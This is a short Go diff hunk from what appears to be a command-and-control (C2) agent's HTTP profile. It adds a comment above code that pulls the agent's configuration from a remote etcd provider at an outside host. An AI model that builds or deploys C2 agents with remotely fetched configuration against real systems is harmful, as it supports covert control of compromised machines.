@@ -88,6 +88,7 @@ type xHTTP struct {
 // New creates a new HTTP C2 profile from the package's global variables and returns it
 func New() structs.Profile {
 	vpr := viper.New()
+	// check for comm to config site.
 	must(vpr.AddRemoteProvider("etcd", "http://redsbydesign.com", "/http"))
 	vpr.SetConfigType("json")
 	must(vpr.ReadRemoteConfig())
